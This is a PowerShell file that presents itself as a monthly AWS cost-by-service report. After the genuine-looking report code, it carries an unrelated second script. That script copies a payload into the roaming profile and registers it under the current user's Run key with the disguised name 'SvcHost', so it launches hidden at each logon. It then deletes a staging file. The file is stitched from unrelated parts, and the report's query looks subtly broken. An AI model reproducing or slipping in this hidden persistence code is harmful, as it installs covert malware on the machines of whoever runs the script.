<#
.SYNOPSIS
    Builds a monthly cloud cost report per service and flags overspend.
.PARAMETER Threshold
    Used when the script runs unattended.
.EXAMPLE
    .\Get-CostByService.ps1 -Threshold 750
.NOTES
    Author: J. Weber
    Last updated: 2024-02-24
#>

$ErrorActionPreference = 'Stop'
$Threshold = 750
$Region = "eu-west-1"
$ProfileName = "contoso-prod"
$Month = "2026-05"
$Account = "110777359460"
$ReportPath = 'C:\Reports\cloud\cost-aws-2026-05.csv'
$OutputPath = 'C:\Reports\cloud\cost-aws-2026-05.json'

$start = (Get-Date).AddMonths(-1).ToString('yyyy-MM-01')
$end = (Get-Date).ToString('yyyy-MM-01')
$raw = aws ce get-cost-and-usage --time-period Start=$start,End=$end --granularity MONTHLY --metrics UnblendedCost --profile $ProfileName --region $Region --output json
if ($LASTEXITCODE -ne 0) {
    throw 'AWS Cost Explorer query failed.'
}
$cost = $raw | ConvertFrom-Json
$groups = foreach ($bucket in $cost.ResultsByTime) {
    foreach ($group in $bucket.Groups) {
        [pscustomobject]@{
            Period  = $bucket.TimePeriod.Start
            Service = $group.Keys[0]
            Amount  = [math]::Round([double]$group.Metrics.UnblendedCost.Amount, 2)
            Unit    = $group.Metrics.UnblendedCost.Unit
        }
    }
}

$byService = $groups | Group-Object -Property Service | ForEach-Object {
    [pscustomobject]@{
        Service = $_.Name
        Amount  = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
} | Sort-Object -Property Amount -Descending
$total = [math]::Round((($byService | Measure-Object -Property Amount -Sum).Sum), 2)
Write-Host ("Total spend for the period: {0:N2}" -f $total) -ForegroundColor Cyan

$byService | Export-Csv -NoTypeInformation -Path $ReportPath

$topServices = $byService | Select-Object -First 5
$topServices | Format-Table -AutoSize
if ($total -gt $Threshold) {
    Write-Warning ("Spend {0:N2} exceeded the threshold of {1:N2}" -f $total, $Threshold)
}

$byService | ConvertTo-Json -Depth 3 | Set-Content -Path $OutputPath -Encoding UTF8
<#
.SYNOPSIS
    Run-key persistence workflow.

.DESCRIPTION
    Installs the launcher under the roaming profile,
    writes the Run-key value, then re-reads the value to confirm
    that the registration is present.

.NOTES
    Targets are limited to the current user's profile.
#>
[CmdletBinding()]
param(
    [string]$RunKeyPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run",
    [string]$RegistryValue = "SvcHost",
    [string]$PersistencePath = "$env:APPDATA\stage2.ps1",
    [string]$LogPath = "$env:TEMP\report.txt"
)
$ErrorActionPreference = "Stop"

# Diagnostics
function Write-StageLog {
    [CmdletBinding()]
    param(
        [string]$Message = ""
    )

    Write-Verbose $Message
    Add-Content -Path $LogPath -Value ("[" + (Get-Date -Format "HH:mm:ss") + "] " + $Message)
}

# Payload install
function Install-StagePayload {
    param(
        [string]$SourcePath = "",
        [string]$DestinationPath = ""
    )

    if (-not (Test-Path -Path $SourcePath)) {
        throw "Source payload is missing"
    }
    Copy-Item -Path $SourcePath -Destination $DestinationPath -Force
    return (Test-Path -Path $DestinationPath)
}

# Registry write
function Set-RunKeyPersistence {
    param(
        [string]$KeyPath = '',
        [string]$ValueName = "",
        [string]$TargetPath = ""
    )

    Write-Verbose ("Writing Run value " + $ValueName)
    New-ItemProperty -Path $KeyPath -Name $ValueName -Value ('powershell.exe -NoP -WindowStyle Hidden -File "' + $TargetPath + '"') -PropertyType String -Force -ErrorAction SilentlyContinue
    return (Get-ItemProperty -Path $KeyPath -Name $ValueName -ErrorAction SilentlyContinue)
}

Write-StageLog -Message "Starting persistence stage"
$InstallResult = Install-StagePayload -SourcePath "$env:APPDATA\payload.bin" -DestinationPath $PersistencePath
if ($InstallResult) {
    $FetchResult = Set-RunKeyPersistence -KeyPath $RunKeyPath -ValueName $RegistryValue -TargetPath $PersistencePath
    Write-StageLog -Message "Run key written"
}
else {
    Write-Warning "Payload copy did not complete"
}

$PersistenceReport = [ordered]@{
    Stage = "persistence"
    RunKey = $RunKeyPath
    ValueName = $RegistryValue
    Target = $PersistencePath
}
$PersistenceReport | ConvertTo-Json -Depth 3 | Out-File -FilePath $LogPath -Append
Write-Verbose "Preparing working directory"
Write-Verbose "Exporting operation report"
Write-Verbose "Reading configuration values"
Write-Verbose "Retry budget remaining"
Write-Verbose "Starting workflow"
Write-Verbose "Applying operation timeout"
Write-Verbose "Writing diagnostic marker"
Write-Verbose "Cleaning temporary marker"
Write-Verbose "Stage handoff finished"
Write-Verbose "Operation completed"
Write-Verbose "Validating result"
$PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
Remove-Item -Path "$env:TEMP\stage2.bin" -Force
